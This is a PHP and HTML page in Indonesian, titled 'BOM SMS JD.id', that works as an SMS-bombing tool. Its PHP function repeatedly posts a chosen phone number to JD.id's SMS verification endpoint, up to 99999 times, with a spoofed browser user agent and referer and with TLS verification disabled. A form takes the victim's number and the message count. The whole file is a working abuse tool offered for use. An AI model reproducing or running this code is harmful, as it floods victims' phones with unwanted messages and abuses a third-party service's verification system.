<?php 
    function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }    
}

if (isset($_POST["BOM"])) {
    $nomor = $_POST['nomer'];
        $jumlah = $_POST['jumlah'];
        $jeda = "1";
        $execute = jdidbom($nomor, $jumlah, $jeda);
        echo "<p style='color:red; text-align:center;'>Sukses BOM!</p>";
}
?>
<!DOCTYPE html> 
<html>
 <head>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
 <style type="text/css">
/*{ padding: 0; margin: 0; } h2{    color:#50626C;  text-align: center;     font-family: arial;     text-transform: uppercase;  border: 5px solid #f1f1f1;  padding: 5px;   width: 300px;   margin: auto;   margin-bottom: 10px; margin-top: 20px; } form { border: 3px solid #f1f1f1; font-family: arial; width: 300px; margin: auto; } input[type=text], input[type=password] , input[type=number]{ width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; box-sizing: border-box; } label{   color:#50626C;  text-transform: uppercase; } button { background-color: #049372; color: white; padding: 14px 20px; margin: 8px 0; border: none; cursor: pointer; width: 100%; } button:hover { opacity: 0.8; } .cancelbtn { width: auto; padding: 10px 18px; background-color: #f03434; } .imgcontainer { text-align: center; margin: 24px 0 12px 0; } img.avatar { width: 40%; border-radius: 50%; } .container { padding: 16px; } span.psw { float: right; padding-top: 16px; } span{     color:#50626C; } /* Change styles for span and cancel button on extra small screens */ /*@media screen and (max-width: 300px) { span.psw { display: block; float: none; } .cancelbtn { width: 100%; } }*/*/
    </style>
<title>BOM SMS JD.id</title>
<link rel="stylesheet" href="style.css" type="text/css">
</head>
<body><!-- 
<h2>Spam</h2>
<form action=""spamersms.php" method="POST">
<div class="container"> 
<label><b>Nomer</b></label> <input type="text" placeholder="Nomer... (085123123...)" name="nomer" id="nomer" value="" required> 

<label><b>Jumlah</b></label> <input type="number" placeholder="Jumlah... (1 - 99999) " name="jumlah" id="jumlah" required> 

<button type="submit">Tembak</button>
<br><br><br>
<center>
<h5>Created By : 
<a href="https://m.facebook.com/666.phtml">Surya Maulana</a>
</h5>
</center> -->
<style type="text/css">
    .formBom{margin-top: 50px; border-radius: 5px;} .headerForm{background-color:#27ae60; color: #fff;padding: 10px 0; font-weight: 1000; margin-bottom: 20px;} body{background:#2c3e50; background-size: cover;} .formBody{background-color: #fff;padding: 10px 20px;} .formBom {background-color: #fff;} form {} button {width: 100%; background-color:#2C3E50; color: #fff;}  .btn:hover {background-color: #34495e; color: #fff;}
</style>
    <div class="container">
        <div class="col-md-4"></div>
        <div class="col-md-4">
            <div class="formBom">
                <div class="headerForm">
                    <h2 class="text-center">BOM SMS</h2>
                </div>
                <div class="formBody">
                    <p class="text-center">Gunakan Dengan Bijak!1!1! -Surya1337</p>
                    <form method="POST" action="spammersms.php">
                      <div class="form-group">
                        <label for="exampleInputEmail1"><span class="glyphicon glyphicon-earphone" aria-hidden="true"></span> No Telp</label>
                        <input type="text" class="form-control" name="nomer" id="exampleInputEmail1" placeholder="Nomor telepon (ex: 0858xxxxxx)">
                      </div>
                      <div class="form-group">
                        <label for="exampleInputPassword1">Jumlah SMS</label>
                        <input type="text" class="form-control" name="jumlah" id="exampleInputPassword1" placeholder="Jumlah (1 - 99999)">
                      </div>
                      
                      <button type="submit" class="btn" name="BOM">BOM !</button>
                    </form>
                    <?php if (isset($_GET["success-bomb"])) {
                        echo "<p class='text-center' style='color:red'>SMS Terkirim!</p>";
                    } ?>
                    <br><br>
                    <h4>Like fanpage kami</h4>
                    <br>
                    <div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = 'https://connect.facebook.net/id_ID/sdk.js#xfbml=1&version=v2.12';
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="fb-page" data-href="https://www.facebook.com/tulungagungcyberlink" data-tabs="timeline" data-height="300" data-small-header="false" data-adapt-container-width="true" data-hide-cover="false" data-show-facepile="false"><blockquote cite="https://www.facebook.com/tulungagungcyberlink" class="fb-xfbml-parse-ignore"><a href="https://www.facebook.com/tulungagungcyberlink">Tulungagung Cyber Link</a></blockquote></div>
                </div>

            </div>
        </div>
        <div class="col-md-4"></div>
    </div>
</body> </html>
<?php



        
    
?>
